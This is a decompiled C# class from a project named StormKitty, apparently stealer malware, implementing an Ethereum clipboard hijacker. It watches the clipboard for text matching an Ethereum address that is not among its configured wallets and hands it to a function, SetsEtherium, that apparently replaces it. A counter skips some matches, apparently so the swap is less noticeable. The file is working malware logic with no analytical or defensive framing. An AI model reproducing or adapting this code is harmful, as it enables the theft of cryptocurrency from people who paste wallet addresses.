﻿using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000059 RID: 89
	internal class Etherium
	{
		// Token: 0x06000143 RID: 323 RVA: 0x00009AC4 File Offset: 0x00007CC4
		public static void GetEtheriumWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletseth.Contains(text) && CheckEth.Clipregex(text))
					{
						if (Etherium._oppToMiss > 0)
						{
							Etherium._oppToMiss--;
						}
						else
						{
							Etherium._oppToMiss = Config.OppToMissDef;
							CheckEth.SetsEtherium(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000DA RID: 218
		public static int _oppToMiss;
	}
}
